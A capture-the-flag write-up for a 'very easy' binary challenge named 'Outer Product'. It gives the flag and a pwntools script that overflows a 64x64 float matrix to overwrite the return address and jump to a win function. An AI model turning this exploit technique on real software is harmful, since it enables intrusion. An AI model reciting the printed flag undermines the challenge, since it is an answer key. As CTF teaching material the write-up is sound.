# Outer Product

**Author** : Lazar Mancic  
**Difficulty** : <font color='lightgreen'>Very Easy</font>  
**Description**: 
Outer product of two coordinate vectors is The Matrix, but in this application it can be much more.

**Flag**: `SCC{35c4p1n6_m47r1x_w17h_b0f_15n'7_700_h4rd!}`

## Solution

Buffer overflow in matrix `mat[64][64]` with vector multiplication.
```py
from pwn import *
import struct

# p = process('./outer')
p = remote('localhost', 1339)
elf = context.binary = ELF('./outer')

def pack_float(value):
    return str(struct.unpack('f', p32(value))[0]).encode()

ret = 0x401016
win = elf.sym['escape_the_matrix']

p.sendlineafter(b'vector: ', b'64')
p.sendlineafter(b'vector: ', b'1 ' * 64)
p.sendlineafter(b'vector: ', b'74')

# Overflowing matrix buffer 64x64
payload = b'0 ' * 66
payload += pack_float(66) + b' '    # j
payload += pack_float(63) + b' '    # i
payload += b'0 ' * 2
payload += pack_float(ret) + b' 0 ' # ret gadget
payload += pack_float(win) + b' 0'  # win function

p.sendlineafter(b'vector: ', payload)

p.interactive()
```